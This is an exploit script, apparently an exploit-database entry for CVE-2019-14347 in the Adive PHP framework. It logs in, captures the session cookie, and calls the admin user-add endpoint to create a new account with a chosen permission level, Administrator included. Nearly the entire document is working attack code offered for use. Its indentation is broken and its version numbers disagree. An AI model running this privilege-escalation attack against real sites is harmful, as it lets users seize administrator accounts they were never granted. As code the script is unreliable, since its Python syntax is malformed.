# Exploit Author: Pablo Santiago
# Vendor Homepage: https://www.adive.es/
# Software Link: https://github.com/ferdinandmartin/adive-php7
# Version: 2.0.7
# Tested on: Windows 10
# CVE : CVE-2019-14347

#Exploit

import requests
import sys

session = requests.Session()

http_proxy  = "http://127.0.0.1:8080"
https_proxy = "https://127.0.0.1:8080"

proxyDict = {
             "http"  : http_proxy,
             "https" : https_proxy
           }
print(&#039;[*****************************************]&#039;)
print(&#039;[ BYPASSING Adive Framework Version.2.0.5 ]&#039;)
print(&#039;[*****************************************]&#039;&#039;\n&#039;)



print(&#039;[+]Login with the correct credentials:&#039; &#039;\n&#039;)

user = input(&#039;[+]user:&#039;)
password = input(&#039;[+]password:&#039;)
print(&#039;\n&#039;)

url = &#039;http://localhost/adive/admin/login&#039;
values = {&#039;user&#039;: user,
          &#039;password&#039;: password,
          }

r = session.post(url, data=values, proxies=proxyDict)
cookie = session.cookies.get_dict()[&#039;PHPSESSID&#039;]

print(&#039;Your session cookie is:&#039;+ cookie +&#039;\n&#039;)


host = sys.argv[1]
print(&#039;Create the new user:&#039;)
userName = input(&#039;[+]User:&#039;)
userUsername = input(&#039;[+]UserName:&#039;)
password = input(&#039;[+]Password:&#039;)
password2 = input(&#039;[+]Confirm Password:&#039;)
print(&#039;The possibles permission are: 1: Administrator, 2: Developer, 3:Editor&#039;)
permission = input(&#039;[+]permission:&#039;)

if (password == password2):
#configure proxy burp

#hacer el request para la creacion de usuario
data = {
&#039;userName&#039;:userName,
&#039;userUsername&#039;:userUsername,
&#039;pass&#039;:password,
&#039;cpass&#039;:password2,
&#039;permission&#039;:permission,

}

headers= {
&#039;Cookie&#039;: &#039;PHPSESSID=&#039;+cookie
}

request = session.post(host+&#039;/adive/admin/user/add&#039;, data=data,
headers=headers, proxies=proxyDict)
print(&#039;+--------------------------------------------------+&#039;)

else:
print (&#039;Passwords dont match!!!&#039;)

#PoC
https://imgur.com/dUgLYi6
https://hackpuntes.com/wp-content/uploads/2019/08/ex.gif

